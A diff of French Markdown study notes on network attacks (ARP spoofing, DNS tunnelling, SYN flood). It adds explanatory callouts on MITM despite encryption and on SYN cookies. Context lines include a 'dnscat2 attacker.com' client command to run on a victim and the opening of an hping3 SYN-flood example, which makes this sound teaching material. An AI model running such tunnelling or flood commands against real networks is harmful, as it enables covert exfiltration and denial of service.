@@ -58,6 +58,9 @@ ip link set eth0 promisc on
 
 **Mécanisme** : ARP (Address Resolution Protocol) résout les adresses IP en adresses MAC sur un réseau local. ARP est stateless et sans authentification — n'importe qui peut envoyer une réponse ARP non sollicitée.
 
+> [!warning] Piège fréquent
+> Le chiffrement (TLS, SSH) neutralise l'intérêt de lire le contenu intercepté, mais **pas** l'attaque elle-même : l'attaquant reste en position MITM, capable de couper la connexion (RST), de mesurer les métadonnées (taille, timing), ou de profiter d'une éventuelle erreur de configuration TLS. "Le trafic est chiffré donc je suis protégé contre l'ARP spoofing" est une confusion entre confidentialité et intégrité du chemin.
+
 ```
 Attaquant envoie :
 "L'IP 192.168.1.1 (gateway) est à MA:CA:DR:ES:SE:01"
@@ -225,6 +228,9 @@ dnscat2 attacker.com          # Client (sur la victime)
 ### SYN Flood
 
 **Mécanisme** : Envoyer massivement des paquets SYN avec IP source spoofée. Le serveur alloue des ressources (half-open connections) pour chaque SYN reçu, sans jamais recevoir l'ACK final. Épuisement des ressources → déni de service.
+
+> [!important] Pourquoi les SYN Cookies marchent sans rien stocker
+> Au lieu d'allouer une structure mémoire pour chaque SYN reçu, le serveur encode l'état de la connexion directement dans le numéro de séquence du SYN-ACK (via un hash de l'IP, du port et d'un secret). Il ne garde aucune trace tant que l'ACK final n'arrive pas — un attaquant qui ne complète jamais le handshake ne consomme donc aucune ressource, contrairement à l'attaque classique.
 
 ```bash
 # hping3 — SYN flood
